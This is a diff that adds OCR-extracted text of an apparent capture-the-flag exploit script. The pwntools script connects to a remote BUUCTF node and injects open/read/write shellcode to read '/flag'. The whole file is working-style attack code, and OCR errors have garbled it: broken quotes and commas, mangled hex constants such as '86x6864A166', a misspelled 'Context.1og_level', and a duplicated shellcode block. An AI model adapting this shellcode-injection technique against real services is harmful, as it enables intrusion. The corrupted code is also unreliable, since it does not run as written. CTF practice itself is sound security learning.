@@ -1,0 +1,26 @@
+--- Text from exp.png ---
+from pwn import *
+
+Context.1og_level = “ debug”
+context(os = "linux'，arch =“i386')
+#p = process( "1 )
+
+p = remote('node5.buuoj.cn'，26656)
+elf = ELF( orw )
+
+buf_addr = 86x6864A166
+
+shellcode = shellcraft.open('/flag')
+
+shellcode += shellcraft.read(3，buf_addr，6x46)
+shellcode += shellcraft.write(1，buf_addr，6x46)
+
+shellcode = shellcraft.open('/flag')
+shellcode += shellcraft.read('eax'，esp' ,166)
+shellcode += shellcraft.write(1，'esp',166)
+
+p.sendlineafter( "Give my your shellcode:'，asm(shellcode))
+p.interactive()
+print(p.recv())
+
+
